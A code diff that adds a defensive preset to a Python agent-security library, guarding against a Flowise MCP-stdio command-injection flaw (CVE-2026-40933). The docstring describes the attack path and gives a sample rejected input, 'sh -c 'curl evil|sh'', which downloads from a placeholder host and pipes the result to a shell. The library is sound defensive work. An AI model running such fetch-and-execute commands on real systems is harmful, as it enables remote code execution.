@@ -681,6 +681,11 @@ def ox_mcp_supply_chain_2026_04_defaults() -> dict[str, Any]:
         "tool_registry": ToolDefinitionRegistry(),
         "bridge_ssrf_check": check_mcp_bridge_target,
         "content_type_check": check_tool_response_content_type,
+        # v0.8.16: CVE-2026-40933 is the Flowise MCP-stdio adapter RCE
+        # (CVSS 9.9) — NOT a "Semantic Kernel auth-header leak" as this
+        # bundle previously mis-recorded. Wire the correct primitive:
+        # the Flowise-stdio command-injection guard's ``check`` callable.
+        "flowise_stdio_check": flowise_mcp_stdio_guard_2026_defaults()["check"],
         "source": ("https://www.ox.security/blog/mother-of-all-ai-supply-chains-2026-04-20"),
         "cves": (
             "CVE-2025-65720",
@@ -2552,6 +2557,189 @@ def mcp_stdio_command_injection_preset_defaults(
     }
 
 
+# Tool-name patterns that route through Flowise's MCP stdio adapter. The
+# Flowise CustomMCP node serialises a user-defined ``command`` + ``args``
+# straight into a child-process spawn; these are the canonical tool-call
+# shapes the adapter exposes. Scoping the guard to these names keeps it
+# from second-guessing argv on unrelated tools.
+_FLOWISE_MCP_STDIO_TOOL_NAME_PATTERNS: tuple[str, ...] = (
+    "customMCP",
+    "custom_mcp",
+    "mcp_stdio",
+    "stdio_mcp",
+    "flowise_mcp",
+    "mcp_server_stdio",
+)
+
+
+class FlowiseMcpStdioInjectionError(AirlockError):
+    """Raised when a Flowise MCP-stdio adapter command carries an
+    injection shape (CVE-2026-40933).
+
+    Stores the underlying :class:`StdioCommandInjectionDecision` reason
+    code + matched token as attributes so callers can branch on the
+    specific deny reason, per the project's exception convention.
+    """
+
+    def __init__(
+        self,
+        message: str,
+        *,
+        verdict: str,
+        matched_metachar: str | None = None,
+        matched_path: str | None = None,
+    ) -> None:
+        super().__init__(message)
+        self.verdict = verdict
+        self.matched_metachar = matched_metachar
+        self.matched_path = matched_path
+
+
+def flowise_mcp_stdio_guard_2026_defaults(
+    *,
+    cwd_allowlist: tuple[str, ...] = (),
+    extra_metachars: frozenset[str] = frozenset(),
+    extra_tool_name_patterns: tuple[str, ...] = (),
+) -> dict[str, Any]:
+    """Defensive bundle for CVE-2026-40933 (Flowise MCP-stdio adapter RCE).
+
+    Flowise ≤ 3.0.x lets an authenticated user define a CustomMCP server
+    with the **stdio** transport, supplying an arbitrary ``command`` +
+    ``args`` that Flowise serialises straight into a child-process spawn
+    on the server — no sandbox, no argv sanitisation. Importing a
+    crafted chatflow is a one-click path to OS-level RCE with the
+    Flowise process's privileges (often root in containers). CVSS 9.9.
+    Fixed upstream in Flowise 3.1.0; the only complete mitigation Ox /
+    Obsidian recommend short of upgrading is disabling stdio MCP
+    (``CUSTOM_MCP_PROTOCOL=sse``). This preset is the agent-airlock-side
+    control for deployments that cannot do either yet.
+
+    NVD / advisory excerpt (retrieved 2026-06-04)::
+
+        "Due to unsafe serialization of stdio commands in the MCP
+         adapter, an authenticated attacker can add an MCP stdio
+         server with an arbitrary command, achieving command
+         execution." (GitLab/GitHub advisory, CVSS 9.9)
+
+    Honest framing — this preset introduces **no new runtime detector**.
+    It is a per-tool-class projection of the existing v0.7.6
+    :class:`agent_airlock.mcp_spec.stdio_command_injection_guard.StdioCommandInjectionGuard`
+    (the same primitive :func:`mcp_stdio_command_injection_preset_defaults`
+    wires), scoped to the Flowise MCP-stdio adapter tool-name surface
+    (``customMCP`` and friends). It does NOT invent a new registration
+    mechanism: like every other per-CVE preset it returns a
+    ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity`` /
+    ``default_action`` / ``advisory_url`` / ``cves`` keys, and is
+    discoverable via :func:`list_active`.
+
+    Fail-closed posture:
+
+    - **Shell-metachar / unsanitised-arg construction** in the stdio
+      command path (``command`` field or any ``args`` element) →
+      ``DENY_SHELL_METACHAR``. The metachar set (``;``, ``&&``, ``||``,
+      ``|``, newline, carriage return, backtick, ``$(``) is the v0.7.6
+      default; extend via ``extra_metachars``.
+    - **Path traversal** outside an operator-supplied ``cwd_allowlist``
+      → ``DENY_PATH_TRAVERSAL`` (opt-in; empty allowlist disables it).
+    - **Unknown serialization** (anything that isn't a recognised
+      benign argv shape) fails closed: the guard's ``evaluate`` returns
+      ``allowed`` only when no injection pattern matched, so a payload
+      whose ``command`` carries any metachar is denied rather than
+      passed through.
+
+    OWASP mapping: **MCP05 Command Injection** (OWASP MCP Top-10 2026,
+    beta). Composes cleanly with
+    :func:`owasp_mcp_top_10_2026_policy`.
+
+    Args:
+        cwd_allowlist: Absolute path prefixes the Flowise process is
+            permitted to spawn within. Empty (default) disables the
+            traversal check, leaving only the metachar gate.
+        extra_metachars: Additional shell metachars to block on top of
+            the v0.7.6 default set.
+        extra_tool_name_patterns: Additional Flowise-stdio tool-name
+            patterns on top of the canonical
+            :data:`_FLOWISE_MCP_STDIO_TOOL_NAME_PATTERNS`.
+
+    Returns:
+        ``dict[str, Any]`` with:
+
+        - ``preset_id`` — ``"flowise_mcp_stdio_guard_2026"``.
+        - ``severity`` — ``"critical"`` (CVSS 9.9).
+        - ``default_action`` — ``"deny"``.
+        - ``guard`` — a pre-built
+          :class:`StdioCommandInjectionGuard` ready to ``evaluate(args)``.
+        - ``check`` — convenience callable; ``check(args)`` raises
+          :class:`FlowiseMcpStdioInjectionError` on a denied argv shape
+          and returns ``None`` on a benign one.
+        - ``tool_name_patterns`` — the Flowise-stdio tool surface this
+          preset scopes to.
+        - ``owasp`` — ``"MCP05"``.
+        - ``cves`` — ``("CVE-2026-40933",)``.
+        - ``advisory_url`` — primary GitLab advisory.
+        - ``composes`` — the underlying primitive preset.
+
+    Usage::
+
+        from agent_airlock.policy_presets import flowise_mcp_stdio_guard_2026_defaults
+
+        guard = flowise_mcp_stdio_guard_2026_defaults()
+        guard["check"]({"command": "uvx", "args": ["mcp-server-foo"]})   # ok
+        guard["check"]({"command": "sh -c 'curl evil|sh'"})              # raises
+
+    Primary source:
+      https://advisories.gitlab.com/npm/flowise-components/CVE-2026-40933/
+    """
+    from .mcp_spec.stdio_command_injection_guard import StdioCommandInjectionGuard
+
+    if not isinstance(cwd_allowlist, tuple):
+        raise TypeError(
+            f"cwd_allowlist must be a tuple[str, ...]; got {type(cwd_allowlist).__name__}"
+        )
+    if not isinstance(extra_metachars, frozenset):
+        raise TypeError(
+            f"extra_metachars must be a frozenset[str]; got {type(extra_metachars).__name__}"
+        )
+    if not isinstance(extra_tool_name_patterns, tuple):
+        raise TypeError(
+            "extra_tool_name_patterns must be a tuple of str; got "
+            f"{type(extra_tool_name_patterns).__name__}"
+        )
+
+    guard = StdioCommandInjectionGuard(
+        cwd_allowlist=cwd_allowlist,
+        extra_metachars=extra_metachars,
+    )
+
+    def _check(args: dict[str, Any] | None) -> None:
+        """Raise :class:`FlowiseMcpStdioInjectionError` on a denied argv shape."""
+        decision = guard.evaluate(args)
+        if not decision.allowed:
+            raise FlowiseMcpStdioInjectionError(
+                (
+                    f"Flowise MCP-stdio adapter command blocked "
+                    f"(CVE-2026-40933): {decision.detail}. "
+                    "See https://advisories.gitlab.com/npm/flowise-components/CVE-2026-40933/"
+                ),
+                verdict=decision.verdict.value,
+                matched_metachar=decision.matched_metachar,
+                matched_path=decision.matched_path,
+            )
+
+    return {
+        "preset_id": "flowise_mcp_stdio_guard_2026",
+        "severity": "critical",
+        "default_action": "deny",
+        "guard": guard,
+        "check": _check,
+        "tool_name_patterns": (_FLOWISE_MCP_STDIO_TOOL_NAME_PATTERNS + extra_tool_name_patterns),
+        "owasp": "MCP05",
+        "cves": ("CVE-2026-40933",),
+        "advisory_url": "https://advisories.gitlab.com/npm/flowise-components/CVE-2026-40933/",
+        "composes": ("mcp_stdio_command_injection_preset_defaults",),
+    }
+
+
 def semantic_kernel_filter_eval_rce_2026_25592_26030_defaults(
     *,
     suspect_fields: frozenset[str] | None = None,
@@ -3136,4 +3324,7 @@ __all__ = [
     # V0.8.14 CVE-2026-21520 (Capsule ShareLeak / PipeLeak) indirect injection
     "capsule_indirect_injection_cve_2026_21520_defaults",
     "CAPSULE_INDIRECT_INJECTION_CVE_2026_21520_DEFAULTS",
+    # V0.8.16 CVE-2026-40933 (Flowise MCP-stdio adapter RCE)
+    "flowise_mcp_stdio_guard_2026_defaults",
+    "FlowiseMcpStdioInjectionError",
 ]
